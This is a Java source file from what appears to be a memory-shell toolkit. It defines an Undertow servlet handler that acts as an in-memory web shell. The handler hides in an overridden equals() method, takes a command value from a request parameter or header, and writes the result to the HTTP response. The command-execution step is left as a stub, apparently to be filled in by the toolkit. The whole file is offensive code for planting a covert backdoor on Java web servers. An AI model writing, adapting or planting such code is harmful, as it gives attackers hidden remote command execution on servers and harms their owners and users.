package com.reajason.javaweb.memshell.shelltool.command;

import java.io.InputStream;
import java.io.OutputStream;
import java.util.Scanner;

/**
 * @author ReaJason
 * @since 2025/5/15
 */
public class CommandUndertowServletHandler {
    private static String paramName;

    @Override
    public boolean equals(Object obj) {
        Object[] args = ((Object[]) obj);
        try {
            Object servletRequestContext = null;
            if (args.length == 2) {
                servletRequestContext = args[1];
            } else {
                servletRequestContext = args[2];
            }
            Object request = servletRequestContext.getClass().getMethod("getServletRequest").invoke(servletRequestContext);
            Object response = servletRequestContext.getClass().getMethod("getServletResponse").invoke(servletRequestContext);
            String p = (String) request.getClass().getMethod("getParameter", String.class).invoke(request, paramName);
            if (p == null || p.isEmpty()) {
                p = (String) request.getClass().getMethod("getHeader", String.class).invoke(request, paramName);
            }
            if (p != null) {
                String param = getParam(p);
                InputStream inputStream = getInputStream(param);
                OutputStream outputStream = (OutputStream) response.getClass().getMethod("getOutputStream").invoke(response);
                outputStream.write(new Scanner(inputStream).useDelimiter("\\A").next().getBytes());
                return true;
            }
        } catch (Throwable e) {
            e.printStackTrace();
        }
        return false;
    }

    private String getParam(String param) {
        return param;
    }

    private InputStream getInputStream(String param) throws Exception {
        return null;
    }
}
